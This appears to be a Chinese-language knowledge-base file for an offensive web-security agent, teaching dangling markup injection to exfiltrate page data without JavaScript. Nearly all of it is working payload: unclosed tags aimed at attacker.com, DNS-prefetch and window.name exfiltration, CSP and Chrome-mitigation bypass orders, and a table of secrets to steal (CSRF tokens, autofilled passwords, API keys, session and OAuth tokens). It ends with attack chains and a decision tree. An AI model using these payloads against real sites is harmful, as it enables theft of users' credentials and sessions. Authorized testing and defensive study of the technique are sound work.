# Dangling Markup 注入 — 无 JavaScript 的数据外带

> CSP 封锁脚本/sanitizer 剥事件处理器/WAF 拦 XSS 模式，但存在 HTML 注入点时的数据窃取技术。
> 加载时机: HTML 注入存在但 XSS 被阻断，注入点之后有敏感数据（CSRF token/预填值/隐藏字段）。
> 核心洞察: **外带数据不需要 JavaScript——只需要浏览器发出一个把数据带在 URL 里的请求**。

## §1 核心机制

注入未闭合标签，其 src/href/action 指向攻击者服务器。未闭合引号**吞噬**后续页面内容直到下一个匹配引号，吞噬内容成为 URL 一部分:
```html
注入: <img src="https://attacker.com/collect?
效果: 到下一个 " 的全部内容（含 <input type="hidden" name="csrf" value="SECRET">）成为 URL 参数
```

注入上下文处理: 属性值内先突破（`"><img src="...`）；标签内容内直接注入；script 块内先闭合（`</script><img src="...`）。

适用三条件: ①HTML 注入点存在 ②JS 被阻断（CSP/sanitizer/WAF）③注入点之后有敏感数据。

限制: 仅捕获同一 HTTP 响应内容；吞噬止于下一个匹配引号；注入点必须在目标数据之前（源码顺序）；URL 不安全字符可能被破坏。

## §2 七种外带向量与 CSP 阻断对照

| 向量 | Payload | CSP 阻断指令 |
|---|---|---|
| img（最常用） | `<img src="https://attacker.com/collect?` | `img-src` |
| form action 劫持 | `<form action="https://attacker.com/collect"><button>Click</button><!--` | `form-action` |
| base 劫持 | `<base href="https://attacker.com/">` | `base-uri` |
| meta refresh | `<meta http-equiv="refresh" content="0;url=https://attacker.com/collect?` | `navigate-to`（罕见配置） |
| link 样式表 | `<link rel="stylesheet" href="https://attacker.com/collect?` | `style-src` |
| table background（旧浏览器） | `<table background="https://attacker.com/collect?` | `img-src` |
| video/audio | `<video poster="https://attacker.com/collect?` / `<audio src="...` | `media-src` / `img-src` |

- form action: 已有 `</form>` 闭合攻击者 form，中间 input 全归攻击者；已有自动提交则免交互
- base href: 劫持后续所有相对 URL（脚本/链接/表单全改道 attacker.com）
- 按 CSP 逐指令试: img-src 受限 → form-action → base-uri → style-src → meta refresh → DNS prefetch（CSP 管不了）

## §3 浏览器差异与 Chrome 缓解绕过

| 浏览器 | 行为 |
|---|---|
| Chrome/Edge（Chromium 60+） | 阻断 img src 含 `<` 或换行的 dangling markup；**`<form action>`/`<base>`/`<link>` 不受影响** |
| Firefox | 更宽松，属性值允许换行 |
| Safari | 类似 Chrome |

Chrome 绕过: 缓解是**标签特定的**——img 被缓解就换 form action / base / meta refresh；Firefox 兜底。

## §4 可窃取数据与高级技巧

| 目标数据 | 页面形态 | 手法 |
|---|---|---|
| CSRF token | `<input type="hidden" name="csrf" value="...">` | form 前注入 dangling 标签 |
| 预填 email/用户名 | `<input value="user@example.com">` | input 前注入 |
| 内联脚本 API key | `var apiKey = "sk-..."` | script 块前注入 |
| 隐藏字段会话 ID | `<input name="session" value="...">` | form 前注入 |
| 自动填充密码 | 密码字段 | `<form action=attacker>` + input name 匹配自动填充 |
| OAuth state/token | URL 参数/隐藏字段 | 授权页注入 |
| 内部 URL/路径 | 链接/脚本源 | `<base>` 劫持 |

高级技巧:
1. **引号选择控制吞噬终点**: 页面用 `"` 则用 `'` 注入（反之亦然）——选错引号 = 捕获无用内容
2. **textarea+form 组合**（img-src 受限时最可靠）: `<form action="https://attacker.com/collect"><textarea name="data">` —— 未闭合 textarea 把后续 HTML 吃成纯文本，提交时整体外带
3. **style dangling**: 未闭合 `<style>` + `@import url("https://attacker.com/?` 外带
4. **window.name via iframe**: `<iframe src="https://target.com/page" name="` —— name 吞噬内容，window.name 跨源导航后保留（罕见跨源数据通道）
5. **DNS prefetch 外带**（严格 CSP 下仍工作）: `<link rel=dns-prefetch href="//stolen-data.attacker.com">` —— CSP 无法阻断 DNS 查询；每标签 ~253 字符，足够传 token

## §5 组合攻击放大

1. **+开放重定向**: `<img src="https://target.com/redirect?url=https://attacker.com/collect?` —— 目标域重定向对部分 CSP 检查呈现同源
2. **+缓存投毒**: 反射注入 + 响应可缓存 → 全体用户中招（反射变存储）
3. **+CSRF**: 偷 CSRF token 后发 CSRF —— token 正确实现也失效
4. **+Clickjacking**: 注入 form+textarea → 页面可框架时透明 iframe 诱导点 Submit → 捕获内容整体提交

放大条件: 响应可缓存 → 投毒放大；存储型 → 每次浏览外带；纯反射 → 钓鱼投递。

## §6 决策树（按序）

```
HTML 注入存在但 XSS 被阻断?
├── 识别注入上下文（属性内→突破 / 内容内→直接 / script 内→闭合）
├── 注入点之后有什么敏感数据?（无 → 换页面找有数据的注入点）
├── 按 CSP 选向量: 无 CSP→img / img-src 限→form→base→link / 全严格→meta refresh→DNS prefetch→window.name
├── Chrome 缓解: 避免 img src 含 < 或换行 → form action / base / Firefox
└── 引号: 目标数据用 " → 注入用 '
```

## §7 关联文件

- `$AGENT_DIR/knowledge-base/xss-advanced.md` — §7 XS-Leaks/CSS 外带（同属无 JS 外带族）
- `$AGENT_DIR/knowledge-base/csp-bypass.md` — CSP 指令体系与绕过
- `$AGENT_DIR/knowledge-base/csrf-clickjacking.md` — 偷 token 后的 CSRF 利用
- `$AGENT_DIR/knowledge-base/cache-poisoning.md` — 缓存投毒放大
